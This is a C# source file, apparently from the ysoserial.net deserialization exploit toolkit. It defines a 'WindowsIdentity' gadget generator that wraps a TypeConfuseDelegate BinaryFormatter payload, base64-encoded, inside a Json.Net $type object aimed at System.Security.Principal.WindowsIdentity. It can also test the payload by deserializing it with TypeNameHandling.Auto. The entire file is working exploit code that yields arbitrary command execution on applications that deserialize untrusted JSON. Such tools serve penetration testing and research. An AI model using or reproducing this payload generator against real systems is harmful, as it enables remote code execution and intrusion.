using System;
using System.Collections.Generic;
using fastJSON;
using Newtonsoft.Json;
using System.Web.Script.Serialization;

namespace ysoserial.Generators
{
    class WindowsIdentityGenerator : GenericGenerator
    {
        public override string Description()
        {
            return "WindowsIdentity Gadget by Levi Broderick";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "Json.Net" };
        }

        public override string Name()
        {
            return "WindowsIdentity";
        }

        public override object Generate(string cmd, string formatter, Boolean test)
        {
            Generator binaryFormatterGenerator = new TypeConfuseDelegateGenerator();
            byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false);
            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);

            if (formatter.ToLower().Equals("json.net"))
            {
                string payload = @"{
                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    'System.Security.ClaimsIdentity.bootstrapContext': '" + b64encoded + @"'
                }";
                
                if (test)
                {
                    try
                    {
                        Object obj = JsonConvert.DeserializeObject<Object>(payload, new JsonSerializerSettings
                        {
                            TypeNameHandling = TypeNameHandling.Auto
                        }); ;
                    }
                    catch
                    {
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }
}
